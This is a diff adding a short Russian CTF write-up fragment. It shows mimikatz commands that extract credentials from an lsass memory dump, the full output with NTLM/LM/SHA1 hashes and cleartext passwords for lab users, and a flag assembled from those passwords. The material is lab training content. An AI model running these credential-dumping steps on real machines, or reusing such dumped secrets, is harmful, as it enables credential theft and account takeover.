@@ -1,0 +1,203 @@
+Запускаем mimikatz:
+
+Using 'mimikatz_log.txt' for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.DMP
+Switch to MINIDUMP : 'lsass.DMP'
+
+mimikatz # sekurlsa::logonPasswords
+Opening : 'lsass.DMP' file for minidump...
+
+Authentication Id : 0 ; 1775365 (00000000:001b1705)
+Session           : RemoteInteractive from 4
+User Name         : Vasyliy
+Domain            : Jon-PC
+Logon Server      : JON-PC
+Logon Time        : 01.11.2022 20:11:13
+SID               : S-1-5-21-2633577515-2458672280-487782642-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * LM       : b0b9bba276c3970c36077a718ccdf409
+	 * NTLM     : 132ddbbcfc377be018a53c284e43dd77
+	 * SHA1     : 6c1f5b9ef80fd74704d16f534539a9e881421663
+	tspkg :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	wdigest :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	kerberos :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1606522 (00000000:0018837a)
+Session           : RemoteInteractive from 3
+User Name         : Kirill
+Domain            : Jon-PC
+Logon Server      : JON-PC
+Logon Time        : 01.11.2022 20:10:18
+SID               : S-1-5-21-2633577515-2458672280-487782642-1002
+	msv :	
+	 [00000003] Primary
+	 * Username : Kirill
+	 * Domain   : Jon-PC
+	 * NTLM     : ce08831fb2a24b79cf5375eee010ccaa
+	 * SHA1     : 9e4e3cafb1bd7ddac01bb93917f17015f3c140cf
+	tspkg :	
+	 * Username : Kirill
+	 * Domain   : Jon-PC
+	 * Password : zd2z3521bmsnbad
+	wdigest :	
+	 * Username : Kirill
+	 * Domain   : Jon-PC
+	 * Password : zd2z3521bmsnbad
+	kerberos :	
+	 * Username : Kirill
+	 * Domain   : Jon-PC
+	 * Password : zd2z3521bmsnbad
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 915545 (00000000:000df859)
+Session           : RemoteInteractive from 2
+User Name         : Vasyliy
+Domain            : Jon-PC
+Logon Server      : JON-PC
+Logon Time        : 01.11.2022 19:41:03
+SID               : S-1-5-21-2633577515-2458672280-487782642-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * LM       : b0b9bba276c3970c36077a718ccdf409
+	 * NTLM     : 132ddbbcfc377be018a53c284e43dd77
+	 * SHA1     : 6c1f5b9ef80fd74704d16f534539a9e881421663
+	tspkg :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	wdigest :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	kerberos :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 915024 (00000000:000df650)
+Session           : RemoteInteractive from 2
+User Name         : Vasyliy
+Domain            : Jon-PC
+Logon Server      : JON-PC
+Logon Time        : 01.11.2022 19:41:03
+SID               : S-1-5-21-2633577515-2458672280-487782642-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * LM       : b0b9bba276c3970c36077a718ccdf409
+	 * NTLM     : 132ddbbcfc377be018a53c284e43dd77
+	 * SHA1     : 6c1f5b9ef80fd74704d16f534539a9e881421663
+	tspkg :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	wdigest :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	kerberos :	
+	 * Username : Vasyliy
+	 * Domain   : Jon-PC
+	 * Password : acbGHBU8
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 01.11.2022 19:31:03
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : JON-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 01.11.2022 19:31:03
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : JON-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : jon-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 22766 (00000000:000058ee)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 01.11.2022 19:30:49
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : JON-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 01.11.2022 19:30:49
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : JON-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : jon-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz # exit
+Bye!
+
+Флаг CTF{acbGHBU8_zd2z3521bmsnbad} (wdigest палит плейнтекстом, но можно и побрутить пароли).
